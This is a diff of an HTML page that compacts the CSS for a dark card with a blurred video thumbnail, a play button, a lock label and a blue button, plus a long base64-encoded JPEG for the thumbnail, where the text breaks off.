@@ -7,76 +7,33 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 html,body{
-  width:100%;height:100%;
-  background:#111;
+  width:100%;height:100%;background:#111;
   font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-  display:flex;align-items:center;justify-content:center;
-  overflow:hidden;
+  display:flex;align-items:center;justify-content:center;overflow:hidden;
 }
-
 #card{
-  width:min(88vw,360px);
-  background:#1a1a1a;
-  border-radius:22px;
-  overflow:hidden;
-  box-shadow:0 24px 60px rgba(0,0,0,.7);
+  width:min(88vw,360px);background:#1a1a1a;
+  border-radius:22px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.7);
 }
-
-#thumb-wrap{
-  position:relative;
-  width:100%;
-  aspect-ratio:4/3;
-  overflow:hidden;
-}
-#thumb{
-  width:100%;height:100%;
-  object-fit:cover;
-  filter:blur(14px);
-  transform:scale(1.08);
-  display:block;
-}
-#overlay{
-  position:absolute;inset:0;
-  background:rgba(0,0,0,.28);
-  display:flex;align-items:center;justify-content:center;
-}
+#thumb-wrap{position:relative;width:100%;aspect-ratio:4/3;overflow:hidden;}
+#thumb{width:100%;height:100%;object-fit:cover;filter:blur(14px);transform:scale(1.08);display:block;}
+#overlay{position:absolute;inset:0;background:rgba(0,0,0,.28);display:flex;align-items:center;justify-content:center;}
 .play-btn{
-  width:60px;height:60px;
-  background:rgba(255,255,255,.18);
-  backdrop-filter:blur(6px);
-  -webkit-backdrop-filter:blur(6px);
-  border:1.5px solid rgba(255,255,255,.35);
-  border-radius:50%;
+  width:60px;height:60px;background:rgba(255,255,255,.18);
+  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+  border:1.5px solid rgba(255,255,255,.35);border-radius:50%;
   display:flex;align-items:center;justify-content:center;
 }
 .play-btn svg{width:26px;height:26px;fill:#fff;margin-left:3px;}
-
-#card-body{
-  padding:18px 18px 20px;
-}
-.lock-row{
-  display:flex;align-items:center;gap:8px;
-  margin-bottom:8px;
-}
+#card-body{padding:18px 18px 20px;}
+.lock-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
 .lock-icon{font-size:1rem;}
-.lock-label{
-  color:#8e8e93;font-size:.72rem;font-weight:500;
-  letter-spacing:.04em;text-transform:uppercase;
-}
-.card-title{
-  color:#fff;font-size:1rem;font-weight:700;
-  margin-bottom:5px;line-height:1.3;
-}
-.card-sub{
-  color:#636366;font-size:.78rem;line-height:1.45;
-  margin-bottom:16px;
-}
+.lock-label{color:#8e8e93;font-size:.72rem;font-weight:500;letter-spacing:.04em;text-transform:uppercase;}
+.card-title{color:#fff;font-size:1rem;font-weight:700;margin-bottom:5px;line-height:1.3;}
+.card-sub{color:#636366;font-size:.78rem;line-height:1.45;margin-bottom:16px;}
 .btn-ver{
-  width:100%;padding:13px;
-  border-radius:12px;
-  background:#0a84ff;border:none;
-  color:#fff;font-size:.9rem;font-weight:700;
-  cursor:pointer;letter-spacing:.01em;
+  width:100%;padding:13px;border-radius:12px;background:#0a84ff;border:none;
+  color:#fff;font-size:.9rem;font-weight:700;cursor:pointer;letter-spacing:.01em;
   display:flex;align-items:center;justify-content:center;gap:7px;
 }
 .btn-ver:active{background:#0060df;}
@@ -87,7 +44,7 @@ html,body{
 
 <div id="card">
   <div id="thumb-wrap">
-    <img id="thumb" src="data:image/jpeg;base64,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